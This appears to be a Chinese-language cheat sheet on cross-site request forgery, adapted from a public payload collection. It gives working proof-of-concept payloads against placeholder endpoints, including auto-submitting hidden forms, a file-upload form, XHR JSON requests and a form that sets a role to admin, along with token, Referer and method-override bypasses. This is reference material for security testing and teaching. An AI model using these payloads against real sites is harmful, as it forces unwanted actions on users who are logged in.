# CSRF - 跨站请求伪造

[SEARCH_KEYWORDS]
漏洞类型: CSRF Cross-Site Request Forgery 跨站请求伪造 XSRF
攻击类型: State Changing Request Forced Action Authentication Bypass
关键词: token referer origin session cookie form submit
方法: GET POST JSON multipart/form-data
绕过技术: Token Bypass Referer Bypass Method Override

[CONTENT]

## CSRF概述

跨站请求伪造(CSRF)是一种攻击，强制已认证用户在Web应用程序上执行非预期操作。CSRF攻击专门针对状态改变请求，而非数据窃取。

## 攻击原理

当用户登录某站点时，通常会有一个会话。会话标识符存储在浏览器Cookie中，每次请求都会发送。即使其他站点触发请求，Cookie也会随请求发送，请求将被视为已登录用户执行。

## GET请求攻击

### 需要用户交互

```html
<a href="http://www.example.com/api/setusername?username=CSRFd">Click Me</a>
```

### 无需用户交互

```html
<img src="http://www.example.com/api/setusername?username=CSRFd">
```

## POST请求攻击

### 需要用户交互

```html
<form action="http://www.example.com/api/setusername" method="POST">
    <input name="username" type="hidden" value="CSRFd" />
    <input type="submit" value="Submit Request" />
</form>
```

### 自动提交（无需交互）

```html
<form id="autosubmit" action="http://www.example.com/api/setusername" method="POST">
    <input name="username" type="hidden" value="CSRFd" />
</form>
<script>
    document.getElementById("autosubmit").submit();
</script>
```

### 带文件上传

```html
<script>
function launch(){
    const dT = new DataTransfer();
    const file = new File(["CSRF-filecontent"], "CSRF-filename");
    dT.items.add(file);
    document.xss[0].files = dT.files;
    document.xss.submit();
}
</script>
<form style="display:none" name="xss" method="post" action="<target>" enctype="multipart/form-data">
    <input id="file" type="file" name="file"/>
</form>
<button onclick="launch()">Submit</button>
```

## JSON请求攻击

### GET请求

```html
<script>
var xhr = new XMLHttpRequest();
xhr.open("GET", "http://www.example.com/api/currentuser");
xhr.send();
</script>
```

### POST请求

```html
<script>
var xhr = new XMLHttpRequest();
xhr.open("POST", "http://www.example.com/api/setrole");
xhr.setRequestHeader("Content-Type", "text/plain");
xhr.send('{"role":"admin"}');
</script>
```

### 表单自动提交绕过

```html
<form id="CSRF_POC" action="www.example.com/api/setrole" enctype="text/plain" method="POST">
    <input type="hidden" name='{"role":"admin", "other":"' value='"}' />
</form>
<script>document.getElementById("CSRF_POC").submit();</script>
```

## 防护绕过

### Token绕过

- 删除Token参数
- 使用其他用户的Token
- 空Token
- 预测Token

### Referer绕过

```html
<meta name="referrer" content="no-referrer">
```

### 方法覆盖

```html
<input type="hidden" name="_method" value="GET">
```

## 常见参数名

```
?checkout_url= ?continue= ?dest= ?destination= ?go=
?next= ?redir= ?redirect_uri= ?redirect_url= ?redirect=
?return_path= ?return_to= ?return= ?returnTo= ?rurl=
?target= ?url= ?view=
```

## 工具

- XSRFProbe - CSRF审计利用工具包

## 参考文档

原始来源: PayloadsAllTheThings/Cross-Site Request Forgery/README.md